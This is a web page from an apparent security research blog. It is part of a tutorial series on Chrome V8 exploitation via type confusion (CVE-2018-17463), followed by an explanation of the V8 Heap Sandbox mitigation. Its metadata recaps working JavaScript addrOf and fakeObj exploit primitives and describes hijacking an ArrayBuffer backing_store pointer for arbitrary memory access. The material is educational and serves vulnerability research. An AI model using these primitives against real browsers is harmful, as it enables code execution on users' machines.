&lt;h2 id=&#34;1-4-Summary&#34;&gt;&lt;a href=&#34;#1-4-Summary&#34; class=&#34;headerlink&#34; title=&#34;1.4 Summary&#34;&gt;&lt;/a&gt;1.4 Summary&lt;/h2&gt;&lt;p&gt;We&amp;#x2019;ve now made it to Part 4, and since it&amp;#x2019;s been quite a long journey, let&amp;#x2019;s take a moment to summarize before moving on! (There&amp;#x2019;s still more ahead &amp;#x1F60E;)&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Part 1&lt;/strong&gt;, we covered the foundational concepts necessary to understand Chrome&amp;#x2019;s internal architecture and the V8 engine.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Part 2&lt;/strong&gt;, we discussed the concept of &lt;strong&gt;Type Confusion&lt;/strong&gt; &amp;#x2014; why it happens when the JavaScript engine misinterprets internal types, and what security risks it introduces.&lt;/p&gt;
&lt;p&gt;In &lt;strong&gt;Parts 3 through 4 (so far)&lt;/strong&gt;, we took a deep dive into how Type Confusion can be leveraged to build &lt;strong&gt;read/write primitives&lt;/strong&gt;, and how those primitives evolve into a &lt;strong&gt;full exploit chain&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Modern browsers operate using multiple processes and complex memory structures to support their wide range of features. This architecture gives attackers numerous potential vectors to target, and by chaining those vectors together, they can gain the ability to read or write arbitrary data in the heap.&lt;/p&gt;
&lt;p&gt;This research post focused on one such vector &amp;#x2014; &lt;strong&gt;Type Confusion&lt;/strong&gt; &amp;#x2014; showing how it can be exploited to manipulate memory and ultimately achieve &lt;strong&gt;remote code execution (RCE)&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;From a technical standpoint, the exploit for &lt;strong&gt;CVE-2018-17463&lt;/strong&gt; can be thought of as consisting of two major phases:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Vulnerability &amp;#x2192; Primitive Construction Phase:&lt;/strong&gt;&lt;br&gt;This phase involves analyzing the Type Confusion bug and crafting reliable &lt;strong&gt;memory read/write primitives&lt;/strong&gt;. It&amp;#x2019;s primarily about understanding the root cause of the bug and the inner workings of the JavaScript engine.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Primitive &amp;#x2192; Code Execution (Weaponization / Pwn) Phase:&lt;/strong&gt;&lt;br&gt;In this phase, the attacker uses the acquired primitives to target &lt;strong&gt;executable memory (RWX)&lt;/strong&gt; and run arbitrary code. This step belongs more to the traditional &lt;strong&gt;pwnable/exploit engineering&lt;/strong&gt; domain.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In other words, when viewed through the lens of &lt;strong&gt;CVE-2018-17463&lt;/strong&gt;, everything up to the creation of the memory read/write primitives belongs to &lt;strong&gt;vulnerability and engine-level research&lt;/strong&gt;, while overwriting the &lt;strong&gt;Wasm instance jump table&lt;/strong&gt; to trigger actual RCE falls under &lt;strong&gt;pwnable exploitation&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Now, if you&amp;#x2019;ve studied pwnable before, you might already know what usually follows such an exploit&amp;#x2026;&lt;/p&gt;
&lt;p&gt;That&amp;#x2019;s right &amp;#x2014; &lt;strong&gt;mitigation&lt;/strong&gt;&amp;#x1F62D;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;(As someone studying vulnerabilities, I can&amp;#x2019;t decide whether to laugh or cry &amp;#x1F602;)&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;In V8, optimizations that occur independently of the developer&amp;#x2019;s intentions can often lead to bugs like Type Confusion. Because this happened far too frequently, &lt;strong&gt;V8 introduced a new mitigation called the Heap Sandbox in early 2020&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;#x2019;s continue and explore what &lt;strong&gt;Heap Sandbox&lt;/strong&gt; is, and how it mitigates these attacks! &amp;#x314E;.&amp;#x314E;&lt;/p&gt;
&lt;h1 id=&#34;2-V8-Heap-Sandbox&#34;&gt;&lt;a href=&#34;#2-V8-Heap-Sandbox&#34; class=&#34;headerlink&#34; title=&#34;2. V8 Heap Sandbox&#34;&gt;&lt;/a&gt;2. V8 Heap Sandbox&lt;/h1&gt;&lt;p&gt;In Chapter 2, &amp;#x201C;sandbox&amp;#x201D; doesn&amp;#x2019;t mean Chrome&amp;#x2019;s process sandbox but rather the heap sandbox inside the renderer &amp;#x2014; i.e., the V8 heap sandbox.&lt;/p&gt;
&lt;h2 id=&#34;2-1-Motivation&#34;&gt;&lt;a href=&#34;#2-1-Motivation&#34; class=&#34;headerlink&#34; title=&#34;2.1 Motivation&#34;&gt;&lt;/a&gt;2.1 Motivation&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image%205.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;For several years before the sandbox, over 60% of Chrome exploits started in V8, but many of those weren&amp;#x2019;t classic memory bugs (UAF, OOB). They were subtle logical bugs in the JIT compiler or runtime &amp;#x2014; or memory corruptions caused by such logic bugs. These aren&amp;#x2019;t problems you can eliminate just by writing &amp;#x201C;better&amp;#x201D; code, because the compiler itself becomes an attack surface. V8 therefore needed a tailored defensive layer that prevents memory corruption in the heap from immediately compromising the rest of the process &amp;#x2014; that is the core goal of the &lt;strong&gt;V8 Heap Sandbox&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Put it simply, the goal is to ensure that &lt;strong&gt;even if a vulnerability causes an arbitrary value (especially a pointer) to be written, that value cannot immediately take over the engine&amp;#x2019;s control flow&lt;/strong&gt;. Like any security feature, the sandbox must keep overhead low. To achieve this, the Heap Sandbox generally follows these conceptual strategies:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Memory partitioning / isolation:&lt;/strong&gt; separate the engine heap memory (and related structures) from other runtime memory (host address space, JIT code pages, etc.) so that a heap value cannot directly translate into an external executable address.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Pointer encapsulation &amp;amp; validation:&lt;/strong&gt; encode (tag) pointer representations stored on the heap or validate pointers before they are used, preventing heap values from being mixed directly with host addresses.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Restricted dereferencing / bounds checks:&lt;/strong&gt; strictly distinguish whether a heap value is an executable code address and prevent interpreting arbitrary data as function pointers.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Overall, V8&amp;#x2019;s sandbox design focuses on protecting the rest of the process under the assumption that an attacker may be able to corrupt heap memory.&lt;/p&gt;
&lt;h2 id=&#34;2-2-Implementation&#34;&gt;&lt;a href=&#34;#2-2-Implementation&#34; class=&#34;headerlink&#34; title=&#34;2.2 Implementation&#34;&gt;&lt;/a&gt;2.2 Implementation&lt;/h2&gt;&lt;p&gt;The key idea in the sandbox design is to change how V8 dereferences addresses: instead of doing direct pointer arithmetic inside the engine, treat heap &lt;strong&gt;references as offsets/indices&lt;/strong&gt;. This prevents raw heap values from becoming host addresses or executable pointers, and lets the runtime control pointer usage tightly. The high-level concept can be broken down as follows.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%206.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;This concept can be divided into &amp;#x201C;sandbox address-space allocation / handling of pointers inside &amp;amp; outside the sandbox / trusted space,&amp;#x201D; and we&amp;#x2019;ll take a closer look at each of those in detail.&lt;/p&gt;
&lt;h3 id=&#34;1-Sandbox-Address-Space&#34;&gt;&lt;a href=&#34;#1-Sandbox-Address-Space&#34; class=&#34;headerlink&#34; title=&#34;1. Sandbox Address Space&#34;&gt;&lt;/a&gt;1. Sandbox Address Space&lt;/h3&gt;&lt;p&gt;The sandbox reserves a &lt;strong&gt;large virtual address space&lt;/strong&gt; that contains the memory V8 directly touches (engine heap, ArrayBuffer backing stores, Wasm memory, etc.). This space is reserved in virtual address space (potentially terabytes) and treated as the &amp;#x201C;sandbox.&amp;#x201D; Generous guard regions surround the sandbox to prevent out-of-bounds sandbox indices from escaping into the host address space, both logically and physically.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%207.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-Sandboxed-Pointers-pointers-inside-the-sandbox&#34;&gt;&lt;a href=&#34;#2-Sandboxed-Pointers-pointers-inside-the-sandbox&#34; class=&#34;headerlink&#34; title=&#34;2. Sandboxed Pointers (pointers inside the sandbox )&#34;&gt;&lt;/a&gt;2. Sandboxed Pointers (pointers inside the sandbox )&lt;/h3&gt;&lt;p&gt;References inside the sandbox are represented not as raw physical addresses but as &lt;strong&gt;offsets from the sandbox base&lt;/strong&gt;. A SandboxedPointer uses a fixed-width offset (for example, 40 bits) relative to the sandbox base, so even if the offset value is corrupted, the resulting address remains inside the sandbox. Security-wise this blocks arbitrary access outside the sandbox; performance-wise it&amp;#x2019;s efficient because the sandbox base can be cached in a CPU register and offset&amp;#x2192;address conversion on x86-64 requires only two extra instructions (and one on ARM64).&lt;/p&gt;
&lt;h3 id=&#34;3-Pointer-Tables-pointers-outside-the-sandbox&#34;&gt;&lt;a href=&#34;#3-Pointer-Tables-pointers-outside-the-sandbox&#34; class=&#34;headerlink&#34; title=&#34;3. Pointer Tables (pointers outside the sandbox )&#34;&gt;&lt;/a&gt;3. Pointer Tables (pointers outside the sandbox )&lt;/h3&gt;&lt;p&gt;Objects outside the sandbox (e.g., DOM nodes, external extension objects) are not referenced directly from within the sandbox. Instead, the sandbox stores &lt;strong&gt;indices into a pointer table&lt;/strong&gt;. Sandboxed objects hold a table index rather than the external pointer itself; at runtime the sandbox resolves that index to an external pointer. This improves safety: spatial safety is enforced by bounds-checking table indices; temporal safety is improved because GC can manage and reclaim table entries. Table entries can also include &lt;strong&gt;type tags&lt;/strong&gt; so that when a pointer is loaded it can be validated against an expected type &amp;#x2014; helping prevent Type Confusion attacks.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%208.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;4-Trusted-Space&#34;&gt;&lt;a href=&#34;#4-Trusted-Space&#34; class=&#34;headerlink&#34; title=&#34;4. Trusted Space&#34;&gt;&lt;/a&gt;4. Trusted Space&lt;/h3&gt;&lt;p&gt;Certain internal V8 objects (for example, bytecode arrays, deoptimization data) are difficult to protect solely with the sandbox or could be risky if mishandled. V8 therefore puts especially sensitive objects into a separate &lt;strong&gt;trusted heap area&lt;/strong&gt; outside the sandbox. This trusted area has its own pointer-compression cage and is accessed from the sandbox via an indirection mechanism (e.g., a Trusted Pointer Table). As a result, even if an attacker corrupts data inside the sandbox, the chances of directly manipulating sensitive trusted objects are greatly reduced.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%209.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;Summary&#34;&gt;&lt;a href=&#34;#Summary&#34; class=&#34;headerlink&#34; title=&#34;Summary&#34;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;In short, the sandbox architecture: (1) isolates the heap into a large virtual address region, (2) represents pointers inside the sandbox as safe offsets, (3) uses index-based tables for references to outside-the-sandbox objects, and (4) isolates especially sensitive objects into a trusted space. This multi-layered approach effectively blocks heap-based vulnerabilities from immediately turning into execution control compromises.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%2010.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;Outro&#34;&gt;&lt;a href=&#34;#Outro&#34; class=&#34;headerlink&#34; title=&#34;Outro&#34;&gt;&lt;/a&gt;Outro&lt;/h1&gt;&lt;p&gt;Before the sandbox, simply overwriting a heap pointer so that a &lt;code&gt;TypedArray&lt;/code&gt;&amp;#x2019;s &lt;code&gt;backing_store&lt;/code&gt; pointed at attacker-chosen memory was often enough to get arbitrary read/write (AAR/AAW) across process memory.&lt;/p&gt;
&lt;p&gt;With the sandbox, the difficulty of Chrome exploitation increased dramatically. The most direct effect is that pointer overwrite attacks are harder: the sandbox stops simple pointer casting or ensures that a corrupted value won&amp;#x2019;t be treated as a valid execution pointer. As a result, achieving a renderer-process RCE from a single vulnerability typically requires a &lt;strong&gt;sandbox escape&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;But raising the difficulty only goes so far &amp;#x2014; if you can escape the sandbox&amp;#x2026;?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image%2011.jpg&#34; alt=&#34;image.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;In the next post I&amp;#x2019;ll cover how renderer RCE is achieved after the sandbox was introduced.&lt;/p&gt;
&lt;p&gt;See you next time! &amp;#x1F64C;&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://jhalon.github.io/chrome-browser-exploitation-3/&#34;&gt;https://jhalon.github.io/chrome-browser-exploitation-3/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://v8.dev/blog/sandbox&#34;&gt;https://v8.dev/blog/sandbox&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/&#34;&gt;https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf&#34;&gt;https://saelo.github.io/presentations/offensivecon_24_the_v8_heap_sandbox.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://m.blog.naver.com/funraon/223669595583&#34;&gt;https://m.blog.naver.com/funraon/223669595583&lt;/a&gt;&lt;/p&gt;
 - hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
  <meta name="naver-site-verification" content="0b4fea742ed293b82621684e466d9f26c3ccee06">


  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] Starting Chrome Exploitation with Type Confusion 101 ^-^☆ Part 4.(EN) - hackyboiz">
  <meta property="og:description" content="&lt;p&gt;Hello, OUYA77 here!&lt;/p&gt;
&lt;p&gt;Last time I failed to manage the post length and stopped after obtaining only the Read/Write primitives; this time I&amp;#x2019;ll go all the way to RCE. So in this post I&amp;#x2019;ll cover the remaining exploit details from CVE-2018-17463 and talk about the Heap Sandbox.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;See previous posts&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 1.&lt;/a&gt;&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 2.&lt;/a&gt;&lt;br&gt;&amp;#x2192; &lt;a href=&#34;https://hackyboiz.github.io/2025/09/26/OUYA77/Chrome_part3/en/&#34;&gt;Starting Chrome Exploitation with Type Confusion 101 ^-^&amp;#x2606; Part 3.&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;0-Recap&#34;&gt;&lt;a href=&#34;#0-Recap&#34; class=&#34;headerlink&#34; title=&#34;0. Recap&#34;&gt;&lt;/a&gt;0. Recap&lt;/h2&gt;&lt;p&gt;In Part 3 we used type confusion to find overlapping property pairs. Because an object pointer was interpreted as a double, by reading/writing the double field we were able to obtain Read/Write primitives from the pointer value being corrupted.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The addrOf Read Primitive&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;addrOf&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-comment&#34;&gt;// 1. Dynamically create the vuln function (bypass Map checks)&lt;/span&gt;
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // We expect p1 to be a Double, but the actual loaded value is&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // an Object pointer (p2)&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x; &lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// target object whose address we want to know&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;}; &lt;span class=&#34;hljs-comment&#34;&gt;// Double (expected type)&lt;/span&gt;
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj}; &lt;span class=&#34;hljs-comment&#34;&gt;// Object (actual loaded value)&lt;/span&gt;

    &lt;span class=&#34;hljs-comment&#34;&gt;// 2. Trigger JIT optimization and induce Type Confusion&lt;/span&gt;
    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-comment&#34;&gt;// If the return value is not 13.37 (i.e., an address leaked), success&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res.toBigInt() - &lt;span class=&#34;hljs-number&#34;&gt;1n&lt;/span&gt;; &lt;span class=&#34;hljs-comment&#34;&gt;// return address with tag removed&lt;/span&gt;
        }
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] AddrOf Primitive Failed&amp;quot;&lt;/span&gt;
}&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;The fakeObj Write Primitive&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Overwrite property x of p1, but due to type confusion&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // we overwrite property y of p2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x = 0x41414141n;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj};

    &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;hljs-number&#34;&gt;10000&lt;/span&gt;; i++) {
        &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; res = vuln(makeObj(pValues));
        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (res != &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; res;
        }
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now that we have a read primitive that can leak addresses and a write primitive that can write to object addresses, we&amp;#x2019;ll refine these into arbitrary memory read/write (AAR/AAW) primitives for the exploit and drive toward RCE.&lt;/p&gt;
&lt;h1 id=&#34;1-CVE-2018-17463-cont&amp;#x2019;d-For-RCE&#34;&gt;&lt;a href=&#34;#1-CVE-2018-17463-cont&amp;#x2019;d-For-RCE&#34; class=&#34;headerlink&#34; title=&#34;1. CVE-2018-17463 (cont&amp;#x2019;d) - For RCE&#34;&gt;&lt;/a&gt;1. CVE-2018-17463 (cont&amp;#x2019;d) - For RCE&lt;/h1&gt;&lt;h2 id=&#34;1-1-Relative-R-W-&amp;#x2192;-AAR-W&#34;&gt;&lt;a href=&#34;#1-1-Relative-R-W-&amp;#x2192;-AAR-W&#34; class=&#34;headerlink&#34; title=&#34;1.1 Relative R/W &amp;#x2192; AAR/W&#34;&gt;&lt;/a&gt;1.1 Relative R/W &amp;#x2192; AAR/W&lt;/h2&gt;&lt;h3 id=&#34;Concept&#34;&gt;&lt;a href=&#34;#Concept&#34; class=&#34;headerlink&#34; title=&#34;Concept)&#34;&gt;&lt;/a&gt;Concept)&lt;/h3&gt;&lt;p&gt;The current read/write primitives let us overwrite property values(pointers) inside other JavaScript objects, but that alone isn&amp;#x2019;t useful for reading/writing arbitrary memory addresses directly.&lt;/p&gt;
&lt;p&gt;The problem stems from &lt;strong&gt;how V8 manages objects&lt;/strong&gt;. Even if we overwrite a memory slot with a value that looks like an address (e.g., &lt;code&gt;0x41414141&lt;/code&gt;), V8 will still treat that value as a &lt;strong&gt;valid JavaScript object pointer&lt;/strong&gt;. So if we write the address where we want to put shellcode into an object pointer slot, V8 will dereference that pointer expecting a real object layout and then try to access its internal fields (for example, the &lt;code&gt;backing store&lt;/code&gt; pointer at offset 8). Because the memory at that address likely does not contain the expected object layout, V8 will crash or the manipulation will fail.&lt;/p&gt;
&lt;p&gt;To get true arbitrary-address read/write(AAR/AAW) we must overwrite an &lt;strong&gt;internal field that V8 actually uses as a raw memory pointer&lt;/strong&gt;, not a JavaScript object pointer. A commonly used target is the &lt;code&gt;backing_store&lt;/code&gt; pointer of an &lt;code&gt;ArrayBuffer&lt;/code&gt;. An &lt;code&gt;ArrayBuffer&lt;/code&gt; represents a fixed-length block of binary data; one of its internal fields is a pointer to the actual memory that stores the bytes &amp;#x2014; the &lt;code&gt;backing_store&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Because typed arrays (&lt;code&gt;TypedArray&lt;/code&gt;, &lt;code&gt;DataView&lt;/code&gt;, etc.) read and write through that &lt;code&gt;backing_store&lt;/code&gt; pointer, controlling it effectively gives us control of what memory a typed-view reads/writes. Crucially, V8 treats the &lt;code&gt;backing_store&lt;/code&gt; as a raw buffer address rather than validating it as a JavaScript object pointer, so overwriting it lets us point an &lt;code&gt;ArrayBuffer&lt;/code&gt; at arbitrary memory.&lt;/p&gt;
&lt;p&gt;Note: you cannot directly read/write data from an &lt;code&gt;ArrayBuffer&lt;/code&gt; without a view &amp;#x2014; you must access it via a &lt;code&gt;TypedArray&lt;/code&gt; or &lt;code&gt;DataView&lt;/code&gt; using the desired format (float, 64-bit integer, etc.). The exploitation flow becomes: use the limited Relative R/W primitive to overwrite an &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#x2018;s &lt;code&gt;backing_store&lt;/code&gt; pointer, then use a &lt;code&gt;TypedArray/DataView&lt;/code&gt; on that buffer to read/write arbitrary memory.&lt;/p&gt;
&lt;h3 id=&#34;Exploitation&#34;&gt;&lt;a href=&#34;#Exploitation&#34; class=&#34;headerlink&#34; title=&#34;Exploitation)&#34;&gt;&lt;/a&gt;Exploitation)&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s see how to implement that concept with the &lt;code&gt;fakeObj&lt;/code&gt; primitive we already used.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;fakeObj&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;{
    &lt;span class=&#34;hljs-built_in&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;`&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    function vuln(obj) {&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.inline;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      this.Object.create(obj);&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      let orig = obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // Overwrite property x of p1, but due to type confusion&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      // we overwrite property y of p2&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      obj.p&lt;span class=&#34;hljs-subst&#34;&gt;${p1}&lt;/span&gt;.x = 0x41414141n;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;      return orig;&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;    }&lt;/span&gt;
&lt;span class=&#34;hljs-string&#34;&gt;  `&lt;/span&gt;);

    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; obj = {&lt;span class=&#34;hljs-attr&#34;&gt;z&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;1234&lt;/span&gt;};
    &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; pValues = [];
    pValues[p1] = {&lt;span class=&#34;hljs-attr&#34;&gt;x&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;13.37&lt;/span&gt;};
    pValues[p2] = {&lt;span class=&#34;hljs-attr&#34;&gt;y&lt;/span&gt;: obj}
    ...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With &lt;code&gt;fakeObj&lt;/code&gt; we can overwrite certain inline properties that overlap with other objects&amp;#x2019; inline fields. In the &lt;code&gt;vuln&lt;/code&gt; function we attempt to write &lt;code&gt;p1.x&lt;/code&gt;, but due to type confusion that write actually targets &lt;code&gt;p2&lt;/code&gt;&amp;#x2018;s inline slot. That allows us to overwrite an object&amp;#x2019;s stored pointer value.&lt;/p&gt;
&lt;p&gt;The diagrams below illustrate the overlap. The &lt;code&gt;ArrayBuffer&lt;/code&gt; backing_store pointer sits at offset 32, so if we create an object with two inline properties (e.g., &lt;code&gt;x1&lt;/code&gt; and &lt;code&gt;x2&lt;/code&gt;) where &lt;code&gt;x2&lt;/code&gt; overlaps that backing_store slot, we can use the &lt;code&gt;fakeObj&lt;/code&gt; write to target the backing_store pointer.&lt;/p&gt;
